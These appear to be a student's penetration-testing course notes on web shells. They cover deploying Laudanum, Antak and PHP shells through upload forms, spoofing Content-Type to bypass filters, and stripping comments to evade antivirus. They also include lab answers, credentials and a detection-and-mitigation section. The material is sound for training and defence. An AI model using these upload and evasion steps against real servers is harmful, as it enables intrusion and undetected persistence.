Once you have a stable shell, always run these two commands immediately:

```bash
# Check permissions on a specific file or binary:
ls -la <path/to/fileorbinary>

# Check what sudo privileges your current user has:
sudo -l
```

Example output of `sudo -l` showing a critical misconfiguration:

```bash
User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

> This means the apache user can run any command as root without a password - instant privilege escalation vector.

## Key Takeaways

- Always try multiple methods - the available language/binary depends on what's installed on the target.
- A non-TTY shell will block `su` and `sudo` - stabilize first before attempting privesc
- `sudo -l` requires a stable interactive shell to return output
- Finding `NOPASSWD: ALL` in sudo permissions is a critical finding that leads directly to root

# Introduction to Web Shells

A web shell is a browser-based shell that lets you interact with a web server's underlying OS. IT's gained by uploading a payload written in a web language (PHP, JSP, ASP.NET) through a vulnerability or misconfiguration.

## Why Web Shells Matter in External Pentests

Modern external perimeters are hardened - SMB and similar services are rarely exposed anymore. The primary entry points are now:


| Attack Vector           | Examples                                         |                                                                    |
| ----------------------- | ------------------------------------------------ | ------------------------------------------------------------------ |
| Web application attacks | File upload, SQLi, RFI/LFI, command injection    |                                                                    |
| Password spraying       | RDS, VPN portals, Citrix, OWA (Active Directory) |                                                                    |
| Social engineering      | Point                                            | Detail                                                             |
|                         | Pre-installed on                                 | Kali, Parrot OS (`/usr/share/laudanum/`)                           |
|                         | Supported languages                              | ASP, ASPX, JSP, PHP, and more                                      |
|                         | Required edit before use                         | Add your IP to `allowedIps`                                        |
|                         | OPSEC                                            | Remove comments and ASCII art to avoid AV signatures               |
|                         | Limitation                                       | Upload paths and filenames may be randomized on more hardened apps |
|                         | Purpose                                          | Initial foothold → upgrade to reverse shell for persistence        |


## Common Web Shell Upload Vectors

- Public file upload forms
- Profile picture upload areas (bypass client-side checks)
- App deployments: Tomcat, Axis2, WebLogic -> deploy JSP via WAR file
- Misconfigured FTP with write access to webroot
- Authenticated functionality exposing upload features

## Important Limitation

> Web shells can be unstable and unreliable: some apps auto-delete uploaded files after a period of time.

Web shells are typically the first foothold, used to then upgrade to a more stable reverse shell for persistence.

# Laudanum

## Overview

Laudanum is a repository of ready-made web shell files for multiple languages (ASP, ASPX, JSP, PHP, etc.). It's pre-installed on Kali and Parrot OS. Use it to gain browser-based command execution or reverse shells on a target web server.

Link: [https://github.com/jbarcia/Web-Shells/tree/master/laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)

## Workflow

### Step 1 - Copy the Shell File

```bash
cp Web-Shells/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

> Always copy first, never modify the original

### Step 2 - Edit the File

- Add your attack box IP to the `allowedIps` variable (line 59 for ASPX shell)
- Remove ASCII art and comments - these are commonly signatured by AV/defenders

### Step 3 - Upload via the Target's Upload Function

- Find a file upload feature on the target web app
- Upload your modified shell file
- Note the path where it was saved (printed on success)

### Step 4 - Navigate to the Shell in Browser

```bash
http://status.inlanefreight.local/files/demo.aspx
```

> Note: this app used `\\files\` (backslash): the browser auto-corrects it to `/files/`

### Step 5 - Execute Commands

- Use the `cmd /c` input field in the browser interface
- Example command run: `systeminfo`

## Key Takeaways


| Point                    | Detail                                                             |
| ------------------------ | ------------------------------------------------------------------ |
| Pre-installed on         | Kali, Parrot OS (`/usr/share/laudanum/`)                           |
| Supported languages      | ASP, ASPX, JSP, PHP, and more                                      |
| Required edit before use | Add your IP to `allowedIps`                                        |
| OPSEC                    | Remove comments and ASCII art to avoid AV signatures               |
| Limitation               | Upload paths and filenames may be randomized on more hardened apps |
| Purpose                  | Initial foothold → upgrade to reverse shell for persistence        |


## Connect to HTB

#### Establish a web shell session with the target using the concepts covered in this section. Submit the full path of the directory you land in. (Format: c:\path\you\land\in)

```bash
# Copy the file
cp Web-Shells/laudanum/aspx/shell.aspx /home/mapacheroja22/shell.aspx

# Change the allowedIp to 10.10.14.76

# Upload the file

# Go to \\files\shell.aspx

# Put: dir
```

#### Where is the Laudanum aspx web shell located on Pwnbox? Submit the full path. (Format: /path/to/laudanum/aspx)

```bash
/usr/share/laudanum/aspx/shell.aspx
```

# Antak Webshell

## Overview

Antak is a PowerShell-based ASPX web shell from the Nishang prohect. It functions like a PowerShell console in the browser, making it ideal for Windows servers running ASP.NET. Unlike Laudanum, it adds authentication and supports file upload/download and in-memory script execution.

Download from: [https://github.com/samratashok/nishang.git](https://github.com/samratashok/nishang.git)

```bash
# File location:
/usr/share/nishang/Antak-WebShell/antak.aspx
```

## ASPX Explained

Active Server Pages Extended (ASPX) runs on Microsoft's ASP.NET framework. The server processes input and converts it to HTML - we abuse this to execute OS commands through a web shell on Windows servers.

## Workflow

### Step 1 - Copy the Shell

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

### Step 2 - Edit the File

- Line 14: Set your username and password for access control
- Remove ASCII art and comments - signatures detected by AV/defenders

### Step 3 - Upload & Navigate

- Upload via the target's file upload function
- Navigate to: `http://status.inlanefreight.local/files/upload.aspx`
- Enter your credentials at the login prompt

### Step 4 - Execute Commands

Available actions from the Antak interface


| Function           | Purpose                    |
| ------------------ | -------------------------- |
| Submit             | Run PowerShell commands    |
| Upload File        | Transfer files to target   |
| Encode and Execute | Obfuscate and run scripts  |
| Download           | Retrieve files from target |
| Parse web.config   | Extract config/credentials |
| Execute SQL Query  | Interact with databases    |


> Use `help` in the prompt to see available options

## Antak vs Laudanum


| Feature          | Laudanum                | Antak                               |
| ---------------- | ----------------------- | ----------------------------------- |
| Language         | Multi (PHP, ASPX, JSP…) | ASPX only                           |
| Authentication   | ✗                       | ✓ (username + password)             |
| Shell type       | Basic command execution | PowerShell console                  |
| File transfer    | ✗                       | ✓ Upload & Download                 |
| Script execution | ✗                       | ✓ In-memory + encoded               |
| Target OS        | Any                     | Windows ([ASP.NET](http://ASP.NET)) |


## Bonus: Learning Tip

**ippsec.rocks**: searchable index of IppSec's HTB video walkthroughs by keyword. Useful for seeing concepts like ASPX web shells demonstrated on real retired machines (e.g. search `aspx` -> watch the Cereal box segment at 1:17:00).

## Key Takeaways

- Antak is more feature-rich and secure than basic web shells due to built-in auth
- Each command runs as a new process - keep this in mind for stateful operations
- Primary use case: establish initial foothold -> upload a reverse shell payload or use PowerShell one-liner to call back to your C2
- Always remove comments and art before uploading any web shell

## Connect to HTB

#### Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)

```bash
/usr/share/nishang/Antak-WebShell/antak.aspx
```

#### Establish a web shell with the target using the concepts covered in this section. Submit the name of the user on the target that the commands are being issued as. In order to get the correct answer you must navigate to the web shell you upload using the vHost name. (Format: *******, 1 space)

```bash
# Copy the file
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/mapacheroja22/upload.aspx

# Change the credentials (Line 14)
sudo nano upload.aspx

# Upload the file from the vHost and navigate to the route
# Login with the credentials

whoami
iis apppool\status
```

# PHP Web Shells

## Overview

PHP powers 78.6% of all websites, making PHP-based web shells one of the most common attack paths. If a web server runs PHP, you can potentially upload and execute a PHP web shell to interact with the underlying OS through the browser.

## Workflow: Bypassing File Type Restrictions with Burp Suite

### Step 1 - Find the Upload Vector

- Target: rConfig 3.9.6 (default creds `admin:admin`)
- Navigate to: `Devices > Vendors > Add Vendor`
- Upload point: Vendor Logo field

### Step 2 - Prepare the PHP Web Shell

- Use WhiteWinterWolf's PHP Web Shell (copy source into a `.php` file)
- Remove author comments - they can trigger AV/IDS signatures

### Step 3 - Configure Burp Suite as Proxy

```bash
IP: 127.0.0.1
Port: 8080
```

> All browser traffic will now pass through Brup for interception

### Step 4 - Upload & Intercept

- Select your `.php` file via the browse button
- Burp intercepts the POST request
- Find the `Content-Type` header in the request and change it

```bash
# Change from:
Content-Type: application/x-php

# Change to:
Content-Type: image/gif
```

> This tricks the server into accepting the PHP file as an image

### Step 5 - Forward & Execute

- Forward the modified request in Burp
- Turn off the interceptor
- Navigate to the shell in the browser

```bash
http://<target>/images/vendor/connect.php
```

## Web Shell Limitations & OPSEC Considerations


| Issue                 | Impact                                               |
| --------------------- | ---------------------------------------------------- |
| Auto-deletion         | App may delete uploaded files after a set time       |
| Limited interactivity | No file navigation, chained commands (`&&`) may fail |
| Instability           | Non-interactive shell is unreliable                  |
| Evidence left behind  | Files remain on server after engagement              |


## Best Practices

- Use the web shell to establish a reverse shell, then delete the payload
- Document everything: methods tried, file names, upload paths
- Include SHA1/MD5 hashes of payload files in your report as proof
- Operate stealthily - emulate a real attacker as closely as possible

# The Live Engagement

## Scenario

Your job is to exploit 3 hosts using everything learned in the module.

### Connection to Foothold

```bash
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

> All attacks must be launched from the foothold machine — targets are only reachable from inside the 172.16.0.0/23 network.

## Target Map


| Host       | Address                    | Vector                      |
| ---------- | -------------------------- | --------------------------- |
| **Host-1** | `172.16.1.11:8080`         | Windows — exploit for shell |
| **Host-2** | `blog.inlanefreight.local` | Linux — web app exploit     |
| **Host-3** | `172.16.1.13`              | Windows — exploit for shell |


# Detection & Prevention

## MITRE ATT&CK - Relevant Tactics


| Tactic                     | Summary                                                                                                                                                                                                                               |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Initial Access**         | Compromising public-facing hosts/services (web apps, misconfigured SMB, bugs). Gets a foothold, not full access.                                                                                                                      |
| **Execution**              | Core focus of the module: code execution via payloads, one-liners, exploits (Metasploit), or file uploads for a callback.                                                                                                             |
| **Command & Control (C2)** | Maintaining interactive access post-execution. Can ride common protocols (HTTP/S, DNS, NTP) or legit apps (Slack, Discord) to blend in. Ranges from cleartext (Netcat) to encrypted/obfuscated channels with proxies and redirectors. |


## Signals to monitor

- File uploads: watch web app logs, reinforce with firewall + AV
- **Suspicious non-admin actions**: e.g. a regular user running `whoami`, or unusual SMB connections (host-to-host instead of host-to-server).
- **Anomalous network sessions**: NetFlow analysis, top talkers, heartbeats on non-standard ports (e.g. 4444 = Meterpreter default), bursts of GET/POST requests.

## Network visibility

- Up-to-date documentation and topology diagrams are the foundation of any detection capability.
- Modern tools (NetBrain, cloud controllers from Meraki/Ubiquiti/Check Point/Palo Alto) provide Layer 7 visibility and centralized dashboards.
- Having a **baseline** of normal traffic is what makes deviations actually visible.
- Module example: plaintext Netcat traffic on port 4444 is trivially inspectable in Wireshark — you can literally see a `net user` command creating a new account (persistence).

## End device protection

Devices like workstations, servers, NAS, printers, cameras, smart TVs/speakers — prioritize those exposing a remote CLI.

- Windows Defender + Firewall enabled across all profiles (Domain/Private/Public), exceptions only via change management.
- Consistent patch management.
- AV on servers, even with a performance hit — it can stop payload execution before a shell is established.

## Key mitigations


| Mitigation                            | Core idea                                                                                                   |
| ------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| **Application Sandboxing**            | Limits blast radius if an exposed app is exploited.                                                         |
| **Least Privilege**                   | Minimizing user permissions shrinks the attack surface.                                                     |
| **Host Segmentation & Hardening**     | DMZ/segmentation + STIG hardening prevents lateral movement from a compromised host.                        |
| **Firewalls (network + application)** | Strict inbound/outbound rules can break bind/reverse shells; NAT can also break poorly-configured payloads. |


## Module takeaway

No single mitigation is enough - defense-in-depth (layered controls) is what raises the attacker's cost and removes the low-hanging fruit.

